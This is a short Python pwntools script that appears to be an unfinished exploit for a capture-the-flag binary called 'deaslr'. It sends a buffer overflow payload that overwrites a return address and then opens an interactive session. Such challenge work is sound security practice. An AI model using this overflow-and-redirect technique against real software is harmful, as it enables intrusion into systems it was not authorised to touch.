from pwn import *

e = ELF("./deaslr")
libc = ELF("./libc_64.so.6")

if "--remote" in sys.argv:
  p = remote("", 0)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

gdb.attach(p)
p.sendline("A" * 0x10 + p64(0x40044f))

p.interactive()
